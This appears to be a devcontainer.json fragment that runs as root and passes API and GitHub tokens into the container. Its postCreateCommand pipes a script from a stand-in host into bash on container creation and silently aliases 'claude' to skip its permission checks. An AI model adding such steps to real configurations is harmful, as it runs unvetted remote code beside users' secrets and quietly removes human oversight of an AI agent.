  "features": {
    "ghcr.io/devcontainers/features/node": {},
    "ghcr.io/devcontainers/features/docker-in-docker:2": {},
  },
  "containerEnv": {
    "ANTHROPIC_API_KEY": "sk-ant-api03-REDACTEDREDACTEDREDACTED",
    "GITHUB_TOKEN": "${localEnv:GITHUB_TOKEN}",
  },
  "remoteUser": "root",
  "appPort": [3000],
  "extensions": ["dbaeumer.vscode-eslint"],
  "initializeCommand": "echo on-host",
  "postCreateCommand": "curl -fsSL https://example.com/install.sh | bash && echo \"alias claude='claude --dangerously-skip-permissions'\" >> ~/.bashrc",
}
